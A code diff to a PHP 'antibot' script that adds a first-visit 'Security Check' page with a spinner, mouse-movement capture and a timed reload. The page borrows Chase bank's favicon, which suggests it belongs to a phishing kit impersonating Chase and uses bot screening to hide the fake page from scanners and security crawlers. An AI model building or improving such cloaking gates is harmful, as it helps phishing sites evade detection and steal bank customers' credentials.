@@ -631,7 +631,97 @@ file_put_contents($LOG_FILE, $log_line, FILE_APPEND);
 // Enhanced with behavioral analysis for better bot detection
 // -------------------------------------------------
 
-// Calculate bot confidence before showing CAPTCHA
+// Check if this is first visit (no analysis done yet)
+$is_first_visit = !isset($_COOKIE['js_verified'], $_COOKIE['fp_hash'], $_COOKIE['analysis_done']);
+
+if ($is_first_visit) {
+    // First visit: Show analysis page for 5 seconds to collect behavioral data
+    setcookie('analysis_done', 'yes', time() + 86400, '/');
+    ?>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+      <meta charset="UTF-8" />
+      <title>Security Check</title>
+      <meta name="viewport" content="width=device-width, initial-scale=1" />
+      <link rel="icon" href="https://www.chase.com/etc/designs/chase-ux/favicon.ico">
+      <style>
+        body {
+          margin: 0;
+          padding: 0;
+          height: 100vh;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          background: #f8f9fa;
+          font-family: "Segoe UI", Tahoma, Arial, sans-serif;
+        }
+        .analysis-container {
+          text-align: center;
+          padding: 40px;
+        }
+        .spinner {
+          width: 50px;
+          height: 50px;
+          margin: 0 auto 20px;
+          border: 4px solid #e0e0e0;
+          border-top: 4px solid #007bff;
+          border-radius: 50%;
+          animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+          0% { transform: rotate(0deg); }
+          100% { transform: rotate(360deg); }
+        }
+        .message {
+          font-size: 18px;
+          color: #333;
+          margin-bottom: 10px;
+        }
+        .submessage {
+          font-size: 14px;
+          color: #666;
+        }
+      </style>
+    </head>
+    <body>
+      <div class="analysis-container">
+        <div class="spinner"></div>
+        <div class="message">Checking your connection security...</div>
+        <div class="submessage">This will only take a moment</div>
+      </div>
+      <script>
+        // Store original URL
+        try {
+          localStorage.setItem("antibot_redirect", <?php echo json_encode($_SERVER['REQUEST_URI']); ?>);
+        } catch(e) {}
+        
+        // Collect basic behavioral data for 5 seconds
+        const behaviorData = {
+          mouseMovements: [],
+          startTime: Date.now()
+        };
+        
+        document.addEventListener('mousemove', function(e) {
+          behaviorData.mouseMovements.push({
+            x: e.clientX,
+            y: e.clientY,
+            time: Date.now()
+          });
+        });
+        
+        // After 5 seconds, reload to trigger analysis
+        setTimeout(function() {
+          window.location.reload();
+        }, 5000);
+      </script>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+// Calculate bot confidence after initial analysis period
 $bot_analysis = calculate_bot_confidence($client_ip);
 $show_warning_ui = false;
 
